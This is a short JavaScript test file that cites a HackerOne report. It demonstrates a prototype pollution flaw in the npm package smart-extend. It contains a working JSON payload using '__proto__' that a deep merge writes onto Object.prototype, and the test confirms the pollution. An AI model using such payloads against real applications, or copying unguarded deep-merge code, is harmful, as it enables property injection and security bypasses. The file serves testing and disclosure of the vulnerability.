//https://hackerone.com/reports/438274

test("prototype pollution in smart-extend", () => {
  var extend = require("smart-extend");
  obj = {};

  expect({}.polluted).toBe(undefined);
  var payload = '{"__proto__":{"polluted":"yes"}}';

  extend.deep({}, JSON.parse(payload));
  expect({}.polluted).toBe("yes");
});
